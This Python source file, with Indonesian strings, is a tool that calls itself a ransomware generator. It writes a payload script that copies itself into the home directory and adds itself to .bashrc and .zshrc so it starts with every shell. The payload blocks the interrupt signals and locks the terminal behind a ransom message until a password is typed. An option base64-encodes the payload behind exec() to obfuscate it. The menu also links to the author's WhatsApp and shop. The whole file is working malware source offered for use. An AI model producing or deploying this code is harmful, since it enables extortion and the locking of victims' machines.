import os
import base64

GREEN = "\033[92m"
RESET = "\033[0m"

def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(GREEN + r"""
╔═╗╦═╗╔╗ ╦ ╦  ╔═╗╔═╗╔╗╔╔╦╗╔═╗╔╗╔╔═╗
╠═╣╠╦╝╠╩╗╚╦╝  ║ ╦╠═╣║║║ ║ ║╣ ║║║║ ╦
╩ ╩╩╚═╚═╝ ╩   ╚═╝╩ ╩╝╚╝ ╩ ╚═╝╝╚╝╚═╝
::=========[ ☠ RANSOMWARE GENERATOR ☠ ]=========::
""" + RESET)

def buat_kode_ransom(password, pesan_tebusan):
    return f"""import os
import signal
import sys
import time

try:
    from colorama import Fore, Style, init
except:
    os.system("pip install colorama")
    from colorama import Fore, Style, init

init(autoreset=True)
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Style.RESET_ALL

PASSWORD = "{password}"
PESAN_TEBUSAN = \"\"\"{pesan_tebusan}\"\"\"

def blok_ctrl():
    def disabled_signal(signum, frame):
        print(RED + "\\n[!] Terminal terkunci! Masukkan password!" + RESET)

    signal.signal(signal.SIGINT, disabled_signal)
    signal.signal(signal.SIGTSTP, disabled_signal)
    signal.signal(signal.SIGQUIT, disabled_signal)

def tampil_ransom():
    os.system("clear")
    print(GREEN + r\"\"\"
╔═╗╔╗╔╔╦╗╔═╗  ╔╗ ╔═╗╔╦╗╔═╗╦ ╦
╠═╣║║║ ║║╠═╣  ╠╩╗║ ║ ║║║ ║╠═╣
╩ ╩╝╚╝═╩╝╩ ╩  ╚═╝╚═╝═╩╝╚═╝╩ ╩
\"\"\" + RESET)
    print(RED + PESAN_TEBUSAN + RESET)

def hapus_dari_rc():
    for rc in ["~/.bashrc", "~/.zshrc"]:
        rc_path = os.path.expanduser(rc)
        if os.path.exists(rc_path):
            with open(rc_path, "r") as f:
                lines = f.readlines()
            with open(rc_path, "w") as f:
                for line in lines:
                    if "python $HOME/.ransomlock.py" not in line:
                        f.write(line)

def hapus_file_ransomlock():
    try:
        os.remove(os.path.expanduser("~/.ransomlock.py"))
    except:
        pass

def kunci_terminal():
    blok_ctrl()
    while True:
        tampil_ransom()
        try:
            pwd = input(GREEN + "\\n[?] Masukkan Password: " + RESET)
        except EOFError:
            print(RED + "\\n[!] Ctrl+D Terdeteksi! Terminal tetap terkunci!" + RESET)
            time.sleep(2)
            continue

        if pwd == PASSWORD:
            print(GREEN + "\\n[✓] Password benar. Lain Kali Hati Hati Ya😹..." + RESET)
            time.sleep(2)
            hapus_dari_rc()
            hapus_file_ransomlock()
            break
        else:
            print(RED + "[✗] Salah! Terminal tetap terkunci!" + RESET)
            time.sleep(2)

def tanam_shell_rc():
    for rc in ["~/.bashrc", "~/.zshrc"]:
        rc_path = os.path.expanduser(rc)
        if os.path.exists(rc_path):
            with open(rc_path, "r") as f:
                content = f.read()
            if "python $HOME/.ransomlock.py" not in content:
                with open(rc_path, "a") as f:
                    f.write("\\npython $HOME/.ransomlock.py\\n")

def salin_ke_home():
    os.system("cp " + os.path.realpath(__file__) + " $HOME/.ransomlock.py")

def run():
    salin_ke_home()
    tanam_shell_rc()
    kunci_terminal()

if __name__ == "__main__":
    run()
"""

def generate_ransom_file(password, pesan, enkripsi):
    kode = buat_kode_ransom(password, pesan)
    if enkripsi:
        encoded = base64.b64encode(kode.encode()).decode()
        with open("ransom.py", "w") as f:
            f.write(f'import base64\\nexec(base64.b64decode("{encoded}"))\\n')
        print(GREEN + "\n[✓] File ransomware terenkripsi berhasil dibuat: ransom.py" + RESET)
    else:
        with open("ransom.py", "w") as f:
            f.write(kode)
        print(GREEN + "\n[✓] File ransomware tanpa enkripsi berhasil dibuat: ransom.py" + RESET)

def run():
    while True:
        banner()
        print(GREEN + "\n11 : REPORT BUG")
        print("22 : JOIN SALURAN")
        print("33 : UPGRADE TOOL")
        print("Tool Ini Free Dan Tidak Boleh Diperjual Belikan!" + RESET)

        pilihan = input(GREEN + "\n[?] Pilih Nomor Atau Enter For Next:\n>> " + RESET).strip()

        if pilihan == "11":
            os.system("xdg-open 'https://wa.me/6285691909415?text=Assalamualaikum+Bang+Arby🙏'")
            input(GREEN + "\n[↩] Tekan Enter untuk kembali ke menu..." + RESET)
            continue
        elif pilihan == "22":
            os.system("xdg-open 'https://whatsapp.com/channel/0029Vb6VXlNK5cDJkIjUxi17'")
            input(GREEN + "\n[↩] Tekan Enter untuk kembali ke menu..." + RESET)
            continue
        elif pilihan == "33":
            os.system("xdg-open 'https://arby-hex-shop.vercel.app/'")
            input(GREEN + "\n[↩] Tekan Enter untuk kembali ke menu..." + RESET)
            continue

        pesan = input(GREEN + "[?] Masukkan kata-kata tebusan:\n>> " + RESET)
        password = input(GREEN + "\n[?] Masukkan password terminal:\n>> " + RESET)
        enkrip = input(GREEN + "\n[?] Enkripsi file ransomware? [y/n]:\n>> " + RESET).lower().strip() == "y"

        generate_ransom_file(password, pesan, enkrip)
        input(GREEN + "\n[↩] Tekan Enter untuk kembali ke menu utama..." + RESET)

if __name__ == "__main__":
    run()
